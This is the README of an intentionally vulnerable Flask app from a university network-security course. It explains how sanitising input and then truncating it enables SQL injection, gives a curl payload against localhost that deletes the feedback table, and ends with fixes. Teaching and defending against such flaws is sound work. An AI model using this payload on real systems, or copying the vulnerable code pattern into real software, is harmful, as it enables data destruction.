# NCS lab 4
Intentionally vulnerable application (home assignment) for [S22] Network and Cyber Security course at Innopolis University.

The application works on Flask framework and contains these intended vulnerabilities:

* SQL Injection

## Launch instructions

### On first startup
* Install flask (if not already): https://flask.palletsprojects.com/en/2.1.x/installation/

* When launching the application for the first time, run `python init_db.py` to initialize the DB using schema

### Start with existing DB
To start the program use this:
```bash
export FLASK_APP=main
flask run
```

## About vulnerabilities
### SQL Injection
#### Description
This vulnerability allows malicious users to execute unintended queries on the server database (or existing queries with unexpected parameters). It allows to perform some dangerous actions on the database, which include deletion of the records, stealing of the personal data, and etc.

#### Technical description
Currently user input is sanitized naively (by replacing single quote with two single quotes: `'` -> `''`). However, after the sanitizing the input is trimmed to not exceed a certain threshold, which may revert this action. Let's look at the code snippet that manages the SQL query:
```python
author = sanitize(author)
text = sanitize(text)
author = author[:128]
text = text[:512]
q = "INSERT INTO feedback (author, text) VALUES ('{}', '{}');".format(
    author, text
)
conn.cursor().executescript(q)
```
Here, if `author` would be equal to 127 `a` characters and one `'`, sanitize would transform it into 129 character-long string and after that remove the last appended quote. This will turn the query into
```python
"INSERT INTO feedback (author, text) VALUES ('aa...aa'', '{}');"
```
which will allow to write unescaped data into the second field. For example, we could send
```python
text=",');delete from feedback;--"
```
which will result in 
```python
text = sanitize(text)
text == ",'');delete from feedback;--" # True
"INSERT INTO feedback (author, text) VALUES ('aa...aa'', ','');delete from feedback;--');"
```
and this is a valid SQL query that gets executed and results in `feedback` table being purged.
##### Note
We can't simply type the values in the input fields since `maxlength` attribute does not allow us to do so. However, we can easily remove it by opening the page source code and editing it. 
#### Exploitation process
Using tool `curl` we can exploit the vulnerability:
```bash
curl -d "author=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'&text=,');delete from feedback;--" -X POST http://127.0.0.1:5000/feedback
```
Assuming the application is running at http://127.0.0.1:5000/
#### Screenshots during exploitation

Before the attack:

![before](./images/before_sqli.png)

The attack:

![during](./images/attack_sqli.png)

Consequences:

![after](./images/after_sqli.png)
As we can see, previous reviews were deleted

#### Fixing recommendations
The following fixes should help with the problem:
1. It's better to use sqlite3's feature called "DB-API's parameter substitution" that is [recommended by authors of the library](https://docs.python.org/3/library/sqlite3.html#sqlite3-placeholders)
2. Use more robust escaping, for example [suggested by the flask's documentation](https://flask.palletsprojects.com/en/2.1.x/quickstart/#html-escaping) `markupsafe.escape`.
3. Trim the strings before manipulations. It helps to avoid the situations similar to aforementioned.
4. Use `execute` instead of `executescript` which ensures that there is only query supplied.
```python
author = author[:128]
text = text[:512]
author = escape(author)
text = escape(text)
conn.cursor().execute(
    "INSERT INTO feedback (author, text) VALUES (?, ?);",
    (author, text)
)
```